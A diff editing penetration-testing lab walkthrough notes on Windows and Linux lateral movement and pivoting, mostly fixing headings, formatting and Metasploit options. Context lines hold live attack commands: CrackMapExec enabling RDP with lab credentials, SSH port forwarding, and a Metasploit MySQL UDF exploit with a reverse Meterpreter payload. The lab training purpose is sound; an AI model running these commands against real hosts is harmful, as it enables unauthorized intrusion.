@@ -10,7 +10,7 @@
 	- Windows Lateral Movement with PsExec
 	- Windows Lateral Movement with SMBExec
 	- Windows Lateral Movement with CrackMapExec
-	- Windows Lateral Movement via RDP
+	- Windows Lateral Movement via RDP Session Configuration Files
 	- Windows Lateral Movement via WinRM
 	- Windows Lateral Movement with Metasploit
 	- Windows Lateral Movement with WMIExec
@@ -1419,7 +1419,6 @@ root@attackdefense:~# crackmapexec smb 10.4.23.124 -u administrator -p 'sebastia
 [*] rdp module options:
 
             ACTION  Enable/Disable RDP (choices: enable, disable) ←
-
 ```
 
 `crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M rdp -o ACTION=enable`:
@@ -1434,7 +1433,7 @@ _Connect to the target machine using RDP to finalize control over the system._
 
 `xfreerdp /u:administrator /p:sebastian /v:10.4.23.124`
 
-### Windows Lateral Movement via RDP - Lab
+### Windows Lateral Movement via RDP Session Configuration Files - Lab
 
 #### Lab Environment
 
@@ -4233,8 +4232,8 @@ Instructions: 
 
 A webapp is running on `target-2`.
 You have managed to get the following credentials for this webapp by using phishing:
-- Username :  "admin"
-- Password  :  "password".
+- Username: "admin"
+- Password: "password".
 
 How to solve this?
 - Metasploit is installed on the Kali instance you will get access to.
@@ -4850,8 +4849,8 @@ Instructions: 
 
 A webapp is running on `target-2`.
 You have managed to get the following credentials for this webapp by using phishing:
-- Username :  "admin"
-- Password  :  "password".
+- Username: "admin"
+- Password: "password".
 
 How to solve this?
 - Metasploit is installed on the Kali instance you will get access to.
@@ -5348,9 +5347,9 @@ In this pivoting challenge, the network architecture is as shown below:
 
 A webapp is running on `target-1`.
 You have managed to get the following credentials for this webapp by using phishing:
-- Username :  "robert"
-- Password  :  "password1"
-- Login URL :  `http://target-1/?/admin`.
+- Username: "robert"
+- Password: "password1"
+- Login URL: `http://target-1/?/admin`.
  
 Your mission is to get the flags kept in flag text files on both `target-1` and `target-2`.
 
@@ -6112,7 +6111,7 @@ f9a32da38bf9fba2b6c7f7b7fe8709a2 ←
 
 ## Linux Lateral Movement and Pivoting
 
-### Linux Lateral Movement and Pivoting: Black-Box Penetration Test (with SOCKS Proxy, SSH Tunneling, Metasploit) - Lab
+### Linux Lateral Movement and Pivoting: Black-Box Penetration Test (with proxychains, SSH Tunneling, Metasploit) - Lab
 
 #### Lab Environment
 
@@ -6131,7 +6130,7 @@ The best tools for this lab are:
 - Nmap
 - Bash shell
 - Hydra
-- MySQL Client.
+- MySQL client.
 
 #### Lab Solution
 
@@ -6373,7 +6372,7 @@ _Execute the reverse shell payload in the background to trigger a connection bac
 
 ```
 [*] Sending stage (984904 bytes) to 192.131.219.3
-                                                 [*] Meterpreter session 1 opened (192.131.219.2:4444 -> 192.131.219.3:56582 ) at 2024-08-23 16:09:45 +0530 ←
+[*] Meterpreter session 1 opened (192.131.219.2:4444 -> 192.131.219.3:56582 ) at 2024-08-23 16:09:45 +0530 ←
 ```
 
 _Exit the current SSH session and return to the Metasploit console to interact with the new Meterpreter session._
@@ -6452,6 +6451,21 @@ ff02::2 ip6-allrouters
 192.131.219.2 INE
 192.131.219.3 demo.ine.local
 192.18.207.3    demo1.ine.local demo
+```
+
+_Review the network connections on the target machine._
+
+`netstat -antp`:
+```
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306 ←        0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.11:33377        0.0.0.0:*               LISTEN      -
+[...]
 ```
 
 _Switch the session back to the background to prepare for further operations._
@@ -6544,14 +6558,21 @@ Nmap scan report for 192.18.207.3
 Host is up (0.0018s latency).
 Not shown: 98 closed tcp ports (conn-refused)
 PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu)) ←
 3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1 ←
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds
 ```
 
-_Create an SSH tunnel to forward the local port 1234 to the MySQL service on the remote machine._
+**Important:** The lab exposes two distinct MySQL services:
+
+1. **Target 1 (`demo.ine.local`, `192.131.219.3`)**: `netstat` shows MySQL bound to `127.0.0.1:3306`, so it must be reached through the SSH port forwarding configured below.
+2. **Target 2 (`192.18.207.3`)**: the proxied Nmap scan shows port `3306` open, so this service is reached through the SOCKS proxy with `proxychains`.
+
+Keep the two targets separate when choosing the connection method and destination address.
+
+_Create an SSH tunnel to forward the local port 1234 to the MySQL service on the remote Target 1 machine._
 
 `ssh -4 -L 1234:127.0.0.1:3306 sysadmin@demo.ine.local`:
 ```
@@ -6629,7 +6650,7 @@ MySQL [(none)]>
 
 _Use Metasploit's `mysql_udf_payload` exploit to upload a UDF (User Defined Function) that will give us a Meterpreter shell on the target._
 
-`search mysql_udf`, `use exploit/multi/mysql/mysql_udf_payload`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set RHOSTS localhost`, `set LPORT 1234`, `show targets`, `set TARGET Linux`, `set LHOST 192.131.219.2`, `set LPORT 5555`, `set PASSWORD nirvana`, `set FORCE_UDF_UPLOAD true`, `exploit -j`:
+`search mysql_udf`, `use exploit/multi/mysql/mysql_udf_payload`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set RHOSTS localhost`, `set RPORT 1234`, `show targets`, `set TARGET Linux`, `set LHOST 192.131.219.2`, `set LPORT 5555`, `set PASSWORD nirvana`, `set FORCE_UDF_UPLOAD true`, `exploit -j`:
 ```
 [*] Exploiting target 0.0.0.1
 
@@ -6654,7 +6675,7 @@ _Use Metasploit's `mysql_udf_payload` exploit to upload a UDF (User Defined Func
 
 _List the available Meterpreter sessions and interact with the new session._
 
-`sessions`, `sessions -i 2`
+`sessions`, `sessions -i 1`
 
 <span style="color: #64b5f6;">**Target 2 machine**</span>.
 
